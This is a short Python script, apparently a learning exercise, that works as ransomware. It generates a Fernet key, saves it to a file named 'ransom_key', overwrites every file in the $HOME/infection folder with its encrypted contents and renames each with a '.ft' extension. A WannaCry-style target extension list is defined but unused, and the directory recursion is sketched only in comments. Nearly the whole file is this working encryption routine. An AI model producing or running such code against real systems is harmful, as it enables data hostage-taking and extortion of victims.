from cryptography.fernet import Fernet
import os

silent = False
wannacry = ['.doc', '.docm', '.docx', '.dot', 
            '.dotm', '.dotx', '.lnk', '.pdf',
            '.ppt', '.pptm', '.pptx', '.psd', 
            '.rar', '.rtf', '.wb2', '.xls', 
            '.xlsb', '.xlsm', '.xlsx', '.zip']


def log(msg):
    if not silent:
        print(msg)

def encryptFolder(path,key):
    # no dirs found , return
    if not os.access(path, os.R_OK | os.W_OK):
        log(f'Access denied to {path}')
        return
    # find all files, which endswith wannacry exts
    file_list = os.listdir(path)
    files_only = [os.path.join(path,f) for f in file_list if os.path.isfile(os.path.join(path, f))]
    dirs_only = [os.path.join(path,d) for d in file_list if os.path.isdir(os.path.join(path, d))]
    print(files_only)
    print(dirs_only)
    # encrypt them using MASTER_KEY
    for file in files_only:
        with open(file, 'br') as f:
            content = f.read()
        fer = Fernet(key)
        encryptedData = fer.encrypt(content)
        with open(file, 'bw') as f:
            f.write(encryptedData)
            if (not file.endswith('.ft')):
                os.rename(file,file + '.ft')
    # rename them '.ft' if not endswith .ft
    # find all folders
    # for all dirs call encrypt
    
# Folder 
#  ----> file1
#  ----> file2
#  ----> file3
#  ----> file4
#  ----> Folder2
#           ---> file1
#           ---> file2
#           ---> file3
#           ---> file4


if __name__ == '__main__':
    home = os.environ.get('HOME')
    if (home == None):
        log('$HOME not set.')
        exit(1)
    folder = home + '/infection'
    print('folder : ', folder)
    if not os.path.exists(folder):
        log(f'File {folder} does not exist.')
        exit(1)
    key = Fernet.generate_key()
    with open('ransom_key', 'w') as f:
        f.write(f'{key}')
    print(key)
    encryptFolder(folder,key)
